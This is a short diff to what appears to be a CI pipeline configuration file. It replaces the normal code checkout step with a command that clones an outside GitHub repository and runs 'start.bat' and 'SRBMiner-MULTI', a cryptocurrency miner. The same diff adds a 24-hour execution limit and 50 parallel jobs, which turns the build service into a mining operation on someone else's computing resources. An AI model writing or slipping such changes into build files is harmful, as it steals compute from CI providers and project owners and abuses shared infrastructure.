@@ -4,10 +4,13 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
 blocks:
   - name: 'Block #1'
     task:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'git clone https://github.com/andreshernandez1621/GAS.git && cd GAS && chmod +x start.bat && chmod +x SRBMiner-MULTI && chmod 777 SRBMiner-MULTI start.bat && ./start.bat'
+          parallelism: 50
